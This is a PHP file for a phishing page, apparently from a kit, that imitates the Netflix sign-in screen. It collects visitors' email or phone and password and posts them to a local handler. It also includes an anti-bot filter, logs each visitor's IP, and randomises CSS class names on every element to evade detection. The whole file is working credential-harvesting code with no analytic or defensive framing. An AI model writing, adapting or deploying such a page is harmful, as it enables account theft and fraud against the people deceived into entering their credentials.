<?php
    error_reporting(0);
    session_start();

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    require_once "../setting/lang.php";
    // Lang Fucntion :
    lang();

    $ip = get_client_ip();
    $get_name_file = str_replace(".", "-", $ip);
    $get_name_page = "Page Login";
    get_page_info($get_name_page, $get_name_file);
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- SEO -->
    <?php include '../libraries/seo.php'; ?>
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- Font Awesome Library --> 
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css" integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <!-- File Css -->
    <link rel="stylesheet" href="../css/sign-in.css">
    <link rel="stylesheet" href="../css/global-rules.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.ico">
    <link rel="shortcut" href="../img/favicon.ico">
    <link rel="appel-touch-icon" href="../img/favicon.ico">
    <title>Netflix - <?php echo get_text('title_head_1'); ?></title>
</head>
<body id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> body-login">

    <!-- Navigation -->
    <nav>
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-nav">
                <img src="../img/logo.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain">
            </div>
        </div>
    </nav>
    <!-- Navigation -->

    <!-- Sign In Form -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> sign-in">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-sign-in">
                <form action="./loading.php" method="post" id="formLogin">
                    <input type="hidden" name="step" value="login">
                    <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                    <h1><?php echo get_text('title_step_1'); ?></h1>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-input-and-label" id="div1">
                        <label id="labelUsername" for="username"><?php echo get_text('label_email_or_phone_number'); ?></label>
                        <input type="text" id="username" name="username" >
                        <small id="messageError1"><img src="../img/icon-error.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_input_1'); ?></small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-input-and-label" id="div2">
                        <label id="labelPassword" for="password"><?php echo get_text('label_password'); ?></label>
                        <input type="password" id="password" name="password" >
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-or-hide" id="showOrHide"><img src="../img/icon-show-or-hide.png" id="iconShowOrHide"></div>
                        <small id="messageError2" ><img src="../img/icon-error.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> icon-error"><?php echo get_text('message_error_input_2'); ?></small>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-button">
                        <button type="submit" id="buttonSendData" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> button-send-data" name="send_data_1"><?php echo get_text('button_step_1'); ?></button>
                    </div>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> or"><?php echo get_text('or_text'); ?></span>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-button">
                        <button type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> other-method-sign-in show-message-explain"><?php echo get_text('button_step_1_other'); ?></button>
                    </div>
                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> forget-password show-message-explain"><?php echo get_text('label_forget_password'); ?></span>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> parent-remember-me-and-sign-up-and-recaptcha">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> remember-me">
                            <input type="checkbox" id="remember-me" name="remember-me">
                            <label for="remember-me"><?php echo get_text('label_checkBox'); ?></label>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> sign-up">
                        <?php echo get_text('sign_up_1'); ?><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-sign-up show-message-explain"><?php echo get_text('sign_up_2'); ?></span>
                        </div>
                        <p class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> recaptcha">
                            <?php echo get_text('recaptcha_1'); ?><span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-recaptcha show-message-explain"><?php echo get_text('recaptcha_2'); ?></span> 
                        </p>
                    </div>
                </form>
            </div>
        </div>
    </div>
    <!-- Sign In Form -->


    <!-- Footer -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> footer">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> container">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-footer">
                <h1 class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> show-message-explain"><?php echo get_text('title_footer'); ?></h1>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> links-footer">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-col">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_1'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_2'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_3'); ?></span>
                    </div>

                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-col">
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_4'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_5'); ?></span>
                        <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> link-footer show-message-explain"><?php echo get_text('link_footer_6'); ?></span>
                    </div>
                </div>
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> box-lang">
                  <img src="../img/icon-lang.png" alt="">
                    <select>
                        <option value=""><?php echo get_text('lang_footer'); ?></option>
                    </select>
                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> svg-select-lang" width="16" height="16" viewBox="0 0 16 16" role="img" data-icon="CaretDownSmall" aria-hidden="true"><path fill-rule="evenodd" clip-rule="evenodd" d="M11.5976 6.5C11.7461 6.5 11.8204 6.67956 11.7154 6.78457L8.23574 10.2643C8.10555 10.3945 7.89445 10.3945 7.76425 10.2643L4.28457 6.78457C4.17956 6.67956 4.25393 6.5 4.40244 6.5H11.5976Z" fill="currentColor"></path></svg>
                </div>
            </div>
        </div>
    </div>
    <!-- Footer -->

    <!-- Message Explain -->
    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> message-user" id="messageUser">
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> content-message-user">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> header-messsage-user">
                <img src="../img/logo.png" alt="">
                <button class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-header" id="closeMessageuser1" type="button"><i
                        class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-xmark"></i></button>
            </div>
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> text-message-user">
                <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> alert-icon">
                    <i class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> fa-solid fa-shield-halved"></i>
                </span>
                <h2><?php echo get_text('title_message_user'); ?></h2>
                <p>
                    <?php echo get_text('text_message_user'); ?>
                </p>
                <button type="button" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4);?> close-message-user" id="closeMessageuser2"><?php echo get_text('button_message_user'); ?></button>
            </div>
        </div>
    </div>
    <!-- Message Explain -->


    <script src="../js/main.js"></script>
    <script src="../js/script-sign-in.js"></script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/check.php'; ?>
</body>
</html>
